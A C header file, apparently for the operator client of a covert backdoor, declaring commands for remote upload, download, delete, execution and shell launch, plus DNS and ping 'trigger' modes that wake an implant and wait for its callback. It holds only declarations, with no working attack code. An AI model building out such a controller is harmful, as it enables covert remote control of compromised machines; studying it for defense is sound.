#ifndef _FCLIENT_H_INC_
#define _FCLIENT_H_INC_
#define _GNU_SOURCE

/* C Library Includes */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <errno.h>

#include "crypto.h"
#include "trigger.h"

/* Preprocessor Macros */
#define DEFAULT_DELAY     30								/* default trigger delay */
#define YES               1
#define NO                0
#define ERROR             -1

/* FOLLOWING DEFINITIONS FOR EXIT THROUGH HELP ARE ALSO IN servers Shell.h file */
#define UPLOAD				1			/* command = ul for upload */
#define EXECUTE				2			/* command = exec for execute */
#define UPLOADEXECUTE		3			/* not implemented */
#define DOWNLOAD			4			/* command = dl for download */
#define DELETE				5			/* command = del for delete */
#define SHUTDOWNBOTH		6			/* command = shut for shutdown, compat.h defines SHUTDOWN as 2 for sockets */
#define HELP				7			/* command = help */
#define LAUNCHTRUESHELL		8
#define EXIT              	10			/* command = ex for exit */

#ifndef SUCCESS
#define SUCCESS	0
#endif

#ifndef FAILURE
#define FAILURE	-1
#endif

// client modes
#define TRIGGER_ONLY		1								/* mode where client will only send triggers */
#define LISTEN_ONLY			2								/* mode where client will only listen for callbacks */
#define TRIGGER_LISTEN		3								/* mode where client will send triggers and then listen for callbacks */

#define TRIG_NONE			0		/* default trigger */
#define TRIG_DNS			1		/* use DNS triggers */
#define TRIG_PING			2		/* use PING triggers */

/* Process Structures and Unions */
struct proc_vars {
	unsigned char		command;        /* One of the ten commands the user wants the program to perform */
	char				*progname;      /* filename of binary executable */
	char				*script;        /* filename of the script file */
	char 				**cstring;      /* vector maintains a list of commands to perform in automatic mode */
	int					tcpfd;          /* file descriptor of the TCP socket */
	unsigned short		interactive;    /* indicates interactive or automatic mode */
	unsigned short		ignore;         /* ignore errors during automatic mode */
	unsigned short		listen;         /* indicates a listen or connect socket */
	struct sockaddr_in	remote;         /* socket info for remote end of connection */
	struct sockaddr_in	local;          /* socket info for local end of connection */
	unsigned int		trig_delay;		/* trigger delay */
	unsigned short 		trigger;		/* indicates whether client will trigger or not*/
};

struct send_buf {
   unsigned char command;               /* equivalent to proc_vars.command */
   char path[255];                      /* filename of the file/application to be executed, uploaded, downloaded, or deleted */
   unsigned long size;                  /* size of the file being uploaded to the remote computer */
   unsigned long padding;               /* not used att ... filled with random bytes */
};

struct recv_buf {
   unsigned long reply;                                    /* reply code from the remote computer; reply == 0 then successful command */
   unsigned long padding;                                  /* size of the file being downloaded to the local computer */
};

union aword {
   unsigned long dword;
   unsigned char byte[4];
   struct {
      unsigned int byte3:8;
      unsigned int byte2:8;
      unsigned int byte1:8;
      unsigned int byte0:8;
   } w;
};

typedef struct _REPLY {
        unsigned long   reply;
        unsigned long   padding;
} REPLY;

/* Function Prototypes */
void Usage(char*);                                         /* definition: misc.c */
char** ReadScript(char*);                                  /* definition: misc.c */
int TcpInit(struct proc_vars*);                            /* definition: misc.c */
void DisplayStatus(struct proc_vars*);                     /* definition: misc.c */
int OpenFile(char *, struct proc_vars * );

void FreeArgv(char**);                                     /* definition: parser.c */
char** BuildArgv(char*);                                   /* definition: parser.c */

void Run(struct proc_vars*, struct trigger_params *);      /* definition: modes.c */
void InteractiveMode(struct proc_vars *, crypt_context *);                   /* definition: modes.c */
void AutomaticMode(struct proc_vars*);                     /* definition: modes.c */

int CommandToFunction(char**, struct proc_vars*, crypt_context * ); /* definition: functions.c */
int Upload(char**, struct proc_vars*);                     /* definition: functions.c */
int Download(char**, struct proc_vars*);                   /* definition: functions.c */
int Remove(char**, struct proc_vars*);                     /* definition: functions.c */
int Execute(char**, struct proc_vars*);                    /* definition: functions.c */
int StopSession(struct proc_vars*);                        /* definition: functions.c */
void DisplayHelp(char*);                                   /* definition: functions.c */
int SendFile(int, size_t);                                 /* definition: functions.c */
int RecvFile(int, int);                                    /* definition: functions.c */
void SendCommand(struct send_buf*, REPLY*, struct proc_vars*);

void GenRandomBytes(char*, int, char*, int);               /* definition: crypto.c */
//void BlowfishEncipher(unsigned long*, unsigned long*);     /* definition: crypto.c */
//void BlowfishDecipher(unsigned long*, unsigned long*);     /* definition: crypto.c */
//short InitializeBlowfish(unsigned char key[], short);      /* definition: crypto.c */
//short PostConnect(struct proc_vars*);                      /* definition: crypto.c */
void Decode(unsigned char*, unsigned char*, unsigned long);
void Encode(unsigned char*, unsigned char*, unsigned long);

#endif /* _FCLIENT_H_INC_ */
